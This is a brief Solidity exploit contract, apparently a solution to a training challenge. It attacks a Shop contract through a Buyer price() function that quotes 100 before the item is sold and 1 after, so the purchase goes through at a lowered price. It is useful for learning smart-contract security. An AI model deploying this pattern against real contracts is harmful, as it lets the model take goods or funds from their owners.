// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttack is Buyer {
  Shop public target;

  constructor(address _target) {
    target = Shop(_target);
  }

  function attack() public {
    target.buy();
  }

  function price() external view override returns (uint) {
    return target.isSold() ? 1 : 100;
  }
}
